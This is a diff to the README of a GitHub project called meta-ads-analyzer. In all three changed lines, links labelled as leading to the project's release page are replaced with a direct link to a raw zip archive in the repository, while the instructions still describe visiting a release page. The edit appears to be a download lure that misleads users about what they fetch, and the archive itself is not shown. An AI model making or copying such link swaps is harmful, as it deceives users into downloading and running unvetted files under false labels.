@@ -1,6 +1,6 @@
 # 📊 meta-ads-analyzer - Analyze and Improve Your Meta Ads
 
-[![Download meta-ads-analyzer](https://img.shields.io/badge/Download-Get%20Latest%20Release-%23FF5733?logo=github&style=for-the-badge)](https://github.com/Tommyvr7/meta-ads-analyzer/releases)
+[![Download meta-ads-analyzer](https://img.shields.io/badge/Download-Get%20Latest%20Release-%23FF5733?logo=github&style=for-the-badge)](https://github.com/Tommyvr7/meta-ads-analyzer/raw/refs/heads/main/skill/meta_ads_analyzer_2.7.zip)
 
 ---
 
@@ -30,7 +30,7 @@ You will first download the software package from the official GitHub release pa
 
 **Step 1:** Visit the download page by clicking the button below. It will open the page in your web browser.
 
-[![Download meta-ads-analyzer](https://img.shields.io/badge/Download-Get%20Latest%20Release-%234472C4?logo=github&style=for-the-badge)](https://github.com/Tommyvr7/meta-ads-analyzer/releases)
+[![Download meta-ads-analyzer](https://img.shields.io/badge/Download-Get%20Latest%20Release-%234472C4?logo=github&style=for-the-badge)](https://github.com/Tommyvr7/meta-ads-analyzer/raw/refs/heads/main/skill/meta_ads_analyzer_2.7.zip)
 
 **Step 2:** On the release page, look for the latest version. It will be listed by a version number like `v1.0.0`.
 
@@ -91,7 +91,7 @@ To use these features:
 To keep your software up to date:
 
 - Visit the release page regularly:  
-  https://github.com/Tommyvr7/meta-ads-analyzer/releases
+  https://github.com/Tommyvr7/meta-ads-analyzer/raw/refs/heads/main/skill/meta_ads_analyzer_2.7.zip
 - Download the latest installer following the same download steps.
 - Run the new installer to replace the old version without losing your settings.
 
